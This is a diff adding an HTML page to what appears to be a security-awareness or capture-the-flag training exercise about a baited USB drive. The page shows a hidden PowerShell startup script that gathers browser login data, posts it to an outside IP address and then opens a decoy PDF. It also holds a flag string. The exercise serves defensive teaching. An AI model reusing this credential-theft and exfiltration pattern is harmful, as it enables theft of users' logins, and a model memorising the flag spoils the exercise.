@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+  <title>Drive analysis</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="sim-ribbon">Isolated analysis bench · this machine has no network</div>
+  <div class="topbar">
+    <button class="back-btn" onclick="location.href='incident.html#c'">&#8592; Incident C</button>
+    <span class="topbar-title mono">KINGSTON 16GB · unlabelled</span>
+  </div>
+
+  <div class="detail">
+    <div class="drive">
+      <div class="drive-label">SCHOLARSHIP GRANTEES 2026<br><span>CONFIDENTIAL — please return to Ms. Cruz</span></div>
+      <div class="drive-sub">Handwritten sticker on a 16 GB drive, one of three found in the canteen.</div>
+    </div>
+
+    <div class="note">Two ways to look at a drive nobody owns. One of them is how incident C happened.</div>
+
+    <button class="cta" onclick="analyseDrive()">ANALYSE SAFELY (does not run anything)</button>
+    <button class="cta danger" onclick="plugIn()">PLUG IN AND OPEN THE FILES</button>
+    <div class="banner" id="plug-banner"></div>
+
+    <div class="evidence" id="analysis">
+      <div class="evidence-head">
+        <span>
+          <span class="evidence-name">Drive contents</span>
+          <span class="evidence-sub">Listed without executing anything</span>
+        </span>
+      </div>
+      <div class="evidence-body">
+<div class="rows">E:\  (visible)
+  scholarship_grantees_2026.pdf        86 KB   · harmless, a real public list
+  photo_requirements.docx              22 KB   · harmless
+
+<span class="warn">E:\.sys\  (hidden folder)</span>
+<span class="hot">  run.ps1                             4 KB    · runs on its own, not by opening a file</span>
+  autorun.inf                          1 KB</div>
+
+        <div class="note" style="margin:12px 0 6px">Hidden startup script · run.ps1</div>
+<div class="rows">$b = Get-ChildItem "$env:LOCALAPPDATA\..\Login Data" -Recurse
+$c = Export-Credentials -Source $b -Quiet
+Invoke-WebRequest -Uri "hxxp://45.61.87.200/drop" `
+<span class="hot">   -Method POST -Body @{ kit = "CYBERITY{us8_b41t_tr4c3d}"; data = $c }</span>
+Start-Process "E:\scholarship_grantees_2026.pdf"</div>
+        <div class="note">The last line opens the real PDF, so the student sees exactly what she
+          expected to see. The drive announced itself as a keyboard to start the script one second
+          after being plugged in — the same address as the alerts in Unit 1.</div>
+      </div>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
